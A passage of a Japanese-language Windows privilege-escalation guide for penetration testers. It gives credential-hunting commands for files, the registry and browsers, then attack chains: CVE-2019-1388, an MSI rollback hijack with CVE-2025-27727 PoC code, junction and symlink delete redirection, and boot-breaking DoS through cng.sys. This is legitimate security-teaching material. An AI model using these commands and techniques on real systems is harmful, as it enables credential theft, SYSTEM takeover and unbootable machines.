Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### ごみ箱内の認証情報

アクセス可能なごみ箱の項目を確認し、削除されたバックアップや構成アーカイブに加えて、ファイル名に認証情報を明示するファイルも探します。有用な `.7z`、`.zip`、`.rar` のバックアップは、数か月前のもので、一般的なファイル名が付いている場合もあります。Windows は元のパスと削除時刻を `$I` レコードに保存し、削除されたファイルを対応する `$R` エントリとして保存します。アーカイブを開く前に、メタデータと現在の ID による読み取りアクセス権を確認してください。表示される内容はボリューム、ユーザー SID、ファイル権限によって異なるため、一覧が空でも復元可能なバックアップが存在しないとは限りません。アーカイブ名は確認候補として扱い、有効なシークレットが含まれている証拠とは見なさないでください。

アクセス可能な削除済み `.pfx` も、**コード署名**の手掛かりになり得ます。アクセス可能な秘密鍵が含まれていれば、その鍵で変更した PowerShell スクリプトに署名できます。[PowerShell では秘密鍵を持つコード署名証明書が必要です](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature)。また、[AppLocker の発行元ルールは署名者の ID とルールの適用範囲を評価します](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker)。アカウントをまたいだ実行には、現在の ID が対象のスクリプトそのものを変更できること、適用されるルールがスクリプトと対象アカウントに対して変更後の署名を許可すること、そしてスケジュールされたタスクなど、より高い権限を持つ実行主体が実際にそのスクリプトを実行することが必要です。`.pfx` というファイル名、証明書のサブジェクト、または書き込み可能なスクリプトだけでは、この一連の条件が成立するとは限りません。秘密鍵を開いたりタスクを実行したりする前に、メタデータ、ACL、ポリシー、スケジュールされたコマンドを確認してください。

また、アクセス可能なメッセージングクライアントのプロファイルデータベース、メモ、受信ファイルも確認し、認証情報の手掛かりを探してください。BitLocker の回復キーのエクスポートは HTML または TXT 形式で保存されている場合があり、名前の付いたバックアップアーカイブ内に含まれていることもあります。こうした資料から、古いバックアップを含む別の暗号化データボリュームにアクセスできる場合があります。アクセスが許可されている場合に限り、ボリュームとアーカイブを確認してください。バックアップに `NTDS.dit` が含まれている場合、オフラインでドメイン認証情報を復元するには、[バックアップと特権グループのワークフロー](../active-directory-methodology/privileged-groups-and-token-privileges.md)で説明されているとおり、対応する `SYSTEM` ハイブも必要です。ファイル名やロックされたボリュームだけでは、使用可能な回復キーやドメインバックアップが存在するとは限りません。

複数のプログラムで保存された**パスワードを復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### レジストリ内

**認証情報を含む可能性のあるその他のレジストリキー**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**レジストリからopenssh keysを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome、Edge、Firefox** のパスワードが保存されているデータベースを確認してください。\
ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

現在のユーザーの標準的なEdge **Default** profileでは、`Login Data` は `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` にあり、`Local State` はその親ディレクトリである `User Data` にあります。[Microsoftのドキュメントに既定のプロファイルの場所が記載されています](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)。別のプロファイルや `UserDataDir` policyによって、場所が変更されている場合があります。ファイルが存在しても、それは認証情報の保存場所を示す手掛かりにすぎません。ファイルを読み取れるか、該当ユーザーのDPAPI contextまたはその他の許可されたkey materialが利用できるか、保存されたログイン情報がより高い権限を持つアカウントのものかを確認してください。パスの列挙だけなら、データベースを開いたり、復号したパスワードを表示したりする必要はありません。

Firefoxについては、[Mozillaのドキュメント](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile)によると、プロファイルの `key4.db` と `logins.json` は、対になるkeyファイルと暗号化されたログイン情報のファイルです。これらのファイルが存在しても、それは手掛かりにすぎません。両方のファイルを読み取れるか、保存されたエントリーがあるか、Primary Passwordによってkeyが保護されているかを確認してから、認証情報を利用できると判断してください。回収した認証情報がドメインアカウントのものなら、そのアカウントの実効的なグループ制御権限と、そのグループの[LAPS passwordの読み取りまたは復号権限](../active-directory-methodology/laps.md)を別々に確認してください。ブラウザーのartifactだけでは、管理者権限への経路があるとは判断できません。

ブラウザーからパスワードを抽出するtools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** はWindows operating systemに組み込まれたtechnologyで、異なる言語で作られたsoftware component間の**相互通信**を可能にします。各COM componentは**class ID (CLSID)で識別**され、各componentは、interface ID (IID)で識別される1つ以上のinterfaceを通じて機能を公開します。

COM classとinterfaceは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** を統合して作成されます。

このレジストリのCLSID内には、子レジストリ **InProcServer32** があります。ここには **DLL** を指す**既定値**と、**Apartment**（Single-Threaded）、**Free**（Multi-Threaded）、**Both**（SingleまたはMulti）、**Neutral**（Thread Neutral）のいずれかを指定する **ThreadingModel** という値が含まれています。

![ブラウザーの履歴 - COM DLL Overwriting: このレジストリのCLSID内には、子レジストリInProcServer32があります。ここにはDLLを指す既定値と、値...](<../../images/image (729).png>)

基本的に、実行される**DLLを上書き**できれば、そのDLLが別のユーザーによって実行される場合に、**privilege escalation**が可能です。

攻撃者がCOM Hijackingをpersistence mechanismとして利用する方法については、以下を参照してください。


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルとレジストリでの汎用的なパスワード検索**

**ファイルの内容を検索する**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**特定のファイル名を持つファイルを検索する**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**レジストリでキー名とパスワードを検索する**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は、私が作成した msf** plugin で、被害者のシステム内で credentials を検索するすべての Metasploit POST module を**自動的に実行します**。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで紹介されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムからパスワードを抽出する優れたツールです。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、このデータを平文で保存する複数のツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

**SYSTEMとして実行中のプロセスが、新しいプロセスを** (`OpenProcess()`) **フルアクセスで開く**とします。同じプロセスが、**低い権限で新しいプロセスを作成** (`CreateProcess()`) **し、メインプロセスの開いているハンドルをすべて継承させます**。\
その後、**低権限プロセスにフルアクセスできる場合**、`OpenProcess()` で作成された**特権プロセスへのオープンハンドルを取得**して、**shellcodeを注入**できます。\
[この脆弱性の**検出方法と悪用方法**の詳細は、こちらの例をご覧ください。](leaked-handle-exploitation.md)\
[こちらの**別の記事では、異なる権限レベル（フルアクセスに限らない）を持つプロセスやスレッドから継承されたオープンハンドルをテストし、悪用する方法について、より詳しく説明しています**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

**パイプ**と呼ばれる共有メモリセグメントにより、プロセス間の通信やデータ転送が可能になります。

Windowsには**Named Pipes**という機能があり、異なるネットワーク上にある場合でも、無関係なプロセス同士がデータを共有できます。これはクライアント/サーバー型のアーキテクチャに似ており、役割は**named pipe server**と**named pipe client**に分かれます。

**クライアント**がパイプ経由でデータを送信すると、パイプを設定した**サーバー**は、必要な**SeImpersonate**権限があれば、**クライアントのIDを偽装**できます。偽装可能なパイプを介して通信する**特権プロセス**を見つければ、自分が設定したパイプとのやり取りを利用して、そのプロセスのIDを採用し、**より高い権限を取得**できます。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)と[**こちら**](#from-high-integrity-to-system)に参考資料があります。

また、次のツールを使うと、burpのようなツールで**named pipeの通信を傍受**できます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。**こちらのツールでは、すべてのパイプを一覧表示して確認し、privescsを探せます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

サーバーモードのTelephonyサービス (TapiSrv) は、`\\pipe\\tapsrv` (MS-TRP) を公開します。リモートの認証済みクライアントは、mailslotベースの非同期イベント経路を悪用して、`ClientAttach` を、`NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の**4バイト書き込み**に変え、その後Telephony管理者権限を取得して、サービスとして任意のDLLを読み込ませることができます。全体の流れ:

- `pszDomainUser` に書き込み可能な既存パスを指定して `ClientAttach` を呼び出す → サービスは `CreateFileW(..., OPEN_EXISTING)` でそのファイルを開き、非同期イベントの書き込みに使用します。
- 各イベントは、`Initialize` の攻撃者制御可能な `InitContext` をそのハンドルに書き込みます。`LRegisterRequestRecipient` (`Req_Func 61`) でline appを登録し、`TRequestMakeCall` (`Req_Func 121`) を実行し、`GetAsyncEvents` (`Req_Func 0`) で取得してから、登録解除/シャットダウンを行うことで、決定的な書き込みを繰り返せます。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加して再接続し、任意のDLLパスを指定して `GetUIDllName` を呼び出すと、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が実行されます。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windowsで実行される可能性のあるファイル拡張子

**[https://filesec.io/](https://filesec.io/)** をご覧ください。

### Markdownレンダラー経由のProtocol handler / ShellExecute悪用

`ShellExecuteExW` に渡されるクリック可能なMarkdownリンクは、危険なURI handler (`file:`、`ms-appinstaller:`、または登録済みの任意のscheme) を起動し、現在のユーザーとして攻撃者が制御するファイルを実行する可能性があります。詳細:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **パスワードを対象としたコマンドラインの監視**

ユーザーとしてshellを取得した際、**コマンドラインに認証情報を渡している**スケジュール済みタスクやその他のプロセスが実行されている場合があります。以下のスクリプトは2秒ごとにプロセスのコマンドラインを取得し、現在の状態と前回の状態を比較して、差分を出力します。

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## プロセスからパスワードを盗む

## 低権限ユーザーから NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（コンソールまたは RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから「NT\AUTHORITY SYSTEM」としてターミナルやその他のプロセスを実行できます。

これにより、同じ脆弱性を使って権限昇格と UAC のバイパスを同時に行えます。さらに、何もインストールする必要はなく、プロセス中に使用されるバイナリは Microsoft によって署名・発行されています。

影響を受けるシステムの一部は以下のとおりです。

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

この脆弱性を exploit するには、以下の手順を実行する必要があります：

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

次のGitHubリポジトリに、必要なファイルと情報がすべてあります。

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator MediumからHigh Integrity Levelへ / UAC Bypass

**Integrity Levelsについて学ぶには、こちらを読んでください**:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、**UACとUAC bypassesについて学ぶには、こちらを読んでください**:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Served RootへのUpload Directory Junctions

アプリケーションが予測可能なupload subdirectoryを作成し、呼び出し元が指定したファイル名でファイルを書き込み、その後ファイルを処理することがあります。サーバー側の書き込み前に、低権限ユーザーがそのsubdirectoryを削除し、NTFS junctionに置き換えられる場合、書き込みがjunctionをたどってweb-served directoryに到達する可能性があります。サーバーがそのファイル形式を実行する場合、そこに配置されたscriptはweb-service identityで実行される可能性があります。これはアプリケーション固有の任意書き込み境界であり、書き込み可能なupload directoryや既存のjunctionだけでは、その脆弱性を証明できません。

upload handlerにおける正確なパス構築とタイミング、ユーザーがsubdirectoryに対して持つ実効的な削除・作成権限、宛先の実効ACL、書き込み処理がreparse pointをたどるかどうか、そしてweb serverが宛先でファイルを実行するかどうかを確認してください。書き込み処理とweb serverのプロセスIDは、それぞれ個別に確認してください。受動的な調査でdirectory ACLとreparse metadataは確認できますが、handlerの動作や、将来のjunction差し替えまでは確認できません。実行がservice accountで行われる場合、別のtoken-privilege経路を検討する前に、**実際のprocess token**を調査してください。

## 任意のFolder Delete/Move/RenameからSYSTEM EoPへ

[**このブログ記事**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)で説明されている手法で、exploit codeは[**こちら**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)から入手できます。<sup>[[31]](#references)[[32]](#references)</sup>

この攻撃は基本的に、Windows Installerのrollback機能を悪用し、アンインストール中に正規ファイルを悪意のあるファイルに置き換えるものです。そのため、攻撃者は**悪意のあるMSI installer**を作成して`C:\Config.Msi`フォルダを乗っ取る必要があります。このフォルダは後にWindows Installerが他のMSI packageのアンインストール中にrollbackファイルを保存するために使用し、rollbackファイルは悪意のあるpayloadを含むように改変されます。

### Windows Installer COM cleanup-path injection (CVE-2025-27727)

低権限のクライアントは、`CMsiConfigurationManager` COM object (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`)を通じて、SYSTEMの`msiexec.exe` serviceにアクセスできます。リバースエンジニアリングにより、関連する`IMsiServer`呼び出しは、vtable offset `0xA0`の`MsiBeginTransactionW`、`0xC8`の`SetEEUIDirectoryAndFilter`、`0x50`の`CleanupTempPackages`であることが特定されました。これらの名前とoffsetはリバースエンジニアリングで特定されたものであり、buildによって異なる場合があります。<sup>[[41]](#references)</sup>

非管理者の場合、`SetEEUIDirectoryAndFilter`は、指定されたパスを`DELETE`、`FILE_FLAG_BACKUP_SEMANTICS`、`FILE_FLAG_OPEN_REPARSE_POINT`を指定して開く間だけ、呼び出し元をimpersonateします。これは呼び出し元がdirectoryを削除できることを示し、reparse pointをたどることを防ぎますが、確認されたfile objectを後続のcleanupに結び付けるものではなく、そのファイルがWindows Installerによって作成されたことを証明するものでもありません。<sup>[[41]](#references)</sup>

`MsiBeginTransactionW`の後、`SetEEUIDirectoryAndFilter`は、呼び出し元のfilter引数にかかわらず、パスをfolderとして登録します。serviceは`HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`の下に、名前付きの`REG_DWORD`値を書き込みます。値の名前は呼び出し元が制御するパスで、データ`0x00000002`はfolder flagです。その後、`CleanupTempPackages(NULL, FALSE)`がcleanupに直接入ります。昇格されたworkerはレジストリ値を列挙し、パスの出所を確認せずにfolderエントリを再帰的な`FDeleteFolder`に渡します。通常の削除に失敗した場合、コードは`LockdownPath`も呼び出し、ファイル属性をクリアして再試行します。<sup>[[41]](#references)</sup>

`msi.dll`から確認された最小限の呼び出し順序は次のとおりです。<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

有用なプリミティブは junction によるリダイレクトではなく、パスの再利用です。攻撃者が作成した `C:\Config.Msi` を登録して削除し、その後 Windows Installer に同じパス名で保護された rollback データを再作成させます。Cleanup は古い `TempPackages` 名を信頼し、新しいディレクトリを SYSTEM として削除します。reparse point は不要なため、これは `FILE_FLAG_OPEN_REPARSE_POINT` とリダイレクト信頼の緩和策が意図した境界を回避します。<sup>[[41]](#references)</sup>

この削除プリミティブは、以下の rollback chain に適合します。別個の `Installer\Folders` レコードを保持し、保護された `C:\Config.Msi` を削除して、NULL DACL で再作成します。また、Installer が DACL を強化する前に `WRITE_DAC` が付与された handle を保持します。事前に開いた handle で `NtSetSecurityObject` を使って permissive な DACL を復元でき、その後、rollback が再開する前に生成された `.rbs` を置き換えられます。<sup>[[41]](#references)</sup>

Microsoft は、新しい feature gate が有効な場合に `CMsiTransaction::SetEEUIDirectoryAndFilter` が `ScheduleFileOrFolderDelete` を呼び出さないようにして、この問題のあるパスを修正しました。COM 呼び出しは引き続き成功を返す場合がありますが、攻撃者が制御するパスは `TempPackages` に登録されなくなります。メソッドの戻り値が成功したかどうかでパッチ適用を判定するのではなく、2025 年 4 月の Windows セキュリティ更新プログラムを適用してください。<sup>[[41]](#references)[[42]](#references)</sup>

この technique の概要は以下のとおりです。

1. **Stage 1 – Hijack の準備（`C:\Config.Msi` を空のままにする）**

- Step 1: MSI をインストールする
    - 書き込み可能なフォルダー（`TARGETDIR`）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成します。
    - **非 admin ユーザー**が実行できるよう、Installer を **「UAC Compliant」** に設定します。
    - インストール後もファイルの **handle** を開いたままにします。

- Step 2: Uninstall を開始する
    - 同じ `.msi` を uninstall します。
    - Uninstall プロセスがファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback backup）に名前を変更し始めます。
    - 開いているファイル handle に対して **`GetFinalPathNameByHandle` をポーリング**し、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: 独自の同期処理
    - `.msi` には **custom uninstall action（`SyncOnRbfWritten`）** が含まれ、以下を行います。
        - `.rbf` が書き込まれたことを通知します。
        - その後、別の event を待ってから uninstall を続行します。

- Step 4: `.rbf` の削除を阻止する
    - 通知を受けたら、`FILE_SHARE_DELETE` を指定せずに **`.rbf` ファイルを開き**ます。これにより **削除を阻止**できます。
    - その後、uninstall を完了できるように応答を通知します。
    - Windows Installer は `.rbf` の削除に失敗し、内容をすべて削除できないため、**`C:\Config.Msi` は削除されません**。

- Step 5: `.rbf` を手動で削除する
    - 攻撃者であるあなたが `.rbf` ファイルを手動で削除します。
    - これで **`C:\Config.Msi` が空になり**、Hijack の準備が整います。

> この時点で、**SYSTEM 権限で任意のフォルダーを削除できる脆弱性を発生させ**、`C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Script を悪意のあるものに置き換える**

- Step 6: 弱い ACL で `C:\Config.Msi` を再作成する
    - `C:\Config.Msi` フォルダーを自分で再作成します。
    - **弱い DACL**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ handle を**開いたままにします**。

- Step 7: 別の Install を実行する
    - 次の設定で `.msi` を再度インストールします。
        - `TARGETDIR`: 書き込み可能な場所。
        - `ERROROUT`: 強制的な失敗を発生させる変数。
    - この install は `.rbs` と `.rbf` を読み込む **rollback** を再度発生させるために使います。

- Step 8: `.rbs` を監視する
    - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ちます。
    - そのファイル名を取得します。

- Step 9: Rollback の前に同期する
    - `.msi` には **custom install action（`SyncBeforeRollback`）** が含まれ、以下を行います。
        - `.rbs` が作成されたときに event を通知します。
        - その後、続行する前に待機します。

- Step 10: 弱い ACL を再適用する
    - `.rbs created` event を受け取った後:
        - Windows Installer が `C:\Config.Msi` に**強い ACL を再適用**します。
        - ただし、`WRITE_DAC` を持つ handle を引き続き保持しているため、**弱い ACL を再適用**できます。

> ACL は **handle を開くときにのみ適用される**ため、引き続きフォルダーに書き込めます。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
    - `.rbs` ファイルを上書きし、Windows に次の処理を指示する **偽の rollback script** を書き込みます。
        - `.rbf` ファイル（悪意のある DLL）を、**特権が必要な場所**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。
    - **SYSTEM レベルの悪意のある payload DLL** を含む偽の `.rbf` を配置します。

- Step 12: Rollback を発生させる
    - 同期 event を通知し、Installer を再開させます。
    - 既知のタイミングで install を**意図的に失敗**させるよう、**type 19 custom action（`ErrorOut`）** が設定されています。
    - これにより **rollback が開始**します。

- Step 13: SYSTEM が DLL をインストールする
    - Windows Installer は以下を行います。
        - 悪意のある `.rbs` を読み込みます。
        - `.rbf` DLL をターゲットの場所にコピーします。
    - これで **SYSTEM が読み込むパスに悪意のある DLL** を配置できます。

- Final Step: SYSTEM のコードを実行する
    - Hijack した DLL を読み込む、信頼された **auto-elevated binary**（例: `osk.exe`）を実行します。
    - **これで、あなたのコードが SYSTEM として実行されます**。


### 任意のファイル削除/移動/名前変更から SYSTEM EoP へ

主な MSI rollback technique（前述）は、**フォルダー全体**（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、脆弱性で可能なのが**任意のファイル削除**だけだとしたらどうでしょうか？

**NTFS internals** を悪用できます。すべてのフォルダーには、次の名前の隠し alternate data stream があります:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

このストリームには、フォルダーの**インデックスメタデータ**が格納されています。

そのため、フォルダーの`::$INDEX_ALLOCATION`ストリームを**削除**すると、NTFSはファイルシステムから**フォルダー全体を削除**します。

次のような標準のファイル削除APIを使用して実行できます。
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> *file* delete API を呼び出しているにもかかわらず、**フォルダ自体が削除されます**。

### フォルダの内容削除から SYSTEM EoP へ
任意のファイルやフォルダを削除できる primitive ではなく、攻撃者が制御するフォルダの**内容を削除できる**だけの場合はどうでしょうか？

1. Step 1: おとりのフォルダとファイルを用意する
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により**実行が一時停止**します。

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. ステップ 3: SYSTEM プロセス（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御が callback に渡されます。

4. ステップ 4: oplock callback 内で削除先をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
    - oplock を解除せずに `folder1` を空にできます。
    - `file1.txt` を直接削除しないでください。oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> これはフォルダーのメタデータを保存するNTFS内部ストリームを対象としており、これを削除するとフォルダーが削除されます。

5. Step 5: oplockを解放する
- SYSTEMプロセスは処理を続け、`file1.txt`を削除しようとします。
- しかし、junction + symlinkによって、実際には次のものを削除しています。
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**任意のフォルダーを SYSTEM/admin として作成できる**プリミティブを悪用します。**ファイルを書き込めない**場合や、**弱いアクセス許可を設定できない**場合でも可能です。

次のように、**重要な Windows ドライバー**の名前を付けた**フォルダー**（ファイルではなく）を作成します。
```
C:\Windows\System32\cng.sys
```

- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- これを**事前にフォルダーとして作成**すると、Windows は起動時に実際の driver を読み込めなくなります。
- その後、Windows は起動中に `cng.sys` を読み込もうとします。
- フォルダーを検出し、**実際の driver を解決できず**、**クラッシュするか起動が停止します**。
- **フォールバックはなく**、外部からの介入（例: boot repair またはディスクアクセス）がなければ**復旧できません**。

### 特権ログ/バックアップパスと OM symlinks による任意ファイルの上書き / boot DoS

**特権サービス**が**書き込み可能な config** から読み取ったパスにログ/エクスポートを書き込む場合、**Object Manager symlinks + NTFS mount points** を使ってそのパスをリダイレクトし、特権による書き込みを任意ファイルの上書きに利用できます（SeCreateSymbolicLinkPrivilege がなくても可能）。<sup>[[15]](#references)</sup>

**要件**
- ターゲットパスを保存する config を攻撃者が書き換えられること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw の [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む特権操作（log、export、report）。

**攻撃チェーンの例**
1. config を読み、特権ログの保存先を特定する。例: `C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待ちます（例：管理者が「テスト SMS を送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になります。
4. 上書きされたファイルを調べ（hex/PE parser）、破損を確認します。再起動すると、Windows は改ざんされたドライバーのパスから読み込もうとし、**boot loop DoS** が発生します。この手法は、特権サービスが書き込み用に開く保護対象ファイル全般にも応用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試されることがあり、破損データを使った信頼性の高い DoS の標的になります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで実行中であれば、**新しいサービスを作成して実行するだけで**、簡単に **SYSTEM へのパス**を確保できます。

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> service binaryを作成する際は、有効なserviceであること、またはbinaryが必要な処理をすぐに実行することを確認してください。有効なserviceでない場合、20秒後に終了させられます。

### AlwaysInstallElevated

High Integrityプロセスから、**AlwaysInstallElevatedのレジストリエントリを有効化**し、_**.msi**_ wrapperを使用してreverse shellを**インストール**できます。\
[関連するレジストリキーと_.msi_パッケージのインストール方法についてはこちらをご覧ください。](#alwaysinstallelevated)

### High + SeImpersonate privilegeからSystemへ

**コードは[**こちら**](seimpersonate-from-high-to-system.md)で確認できます。**

### SeDebug + SeImpersonateからFull Token privilegesへ

これらのtoken privilegesを持っている場合（おそらく、すでにHigh Integrityのプロセス内で確認できます）、SeDebug privilegeを使って**ほぼすべてのプロセス**（保護されたプロセスを除く）を**開き**、そのプロセスのtokenを**コピー**して、そのtokenを使った**任意のプロセスを作成**できます。\
この手法では通常、すべてのtoken privilegesを持つSYSTEM実行中のプロセスを**選択します**（_すべてのtoken privilegesを持たないSYSTEMプロセスも存在します_）。\
**提案した手法を実行するコードの[**例はこちら**](sedebug-+-seimpersonate-copy-token.md)で確認できます。**

### **Named Pipes**

この手法はmeterpreterが`getsystem`で権限昇格する際に使用します。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegesを取得できます。\
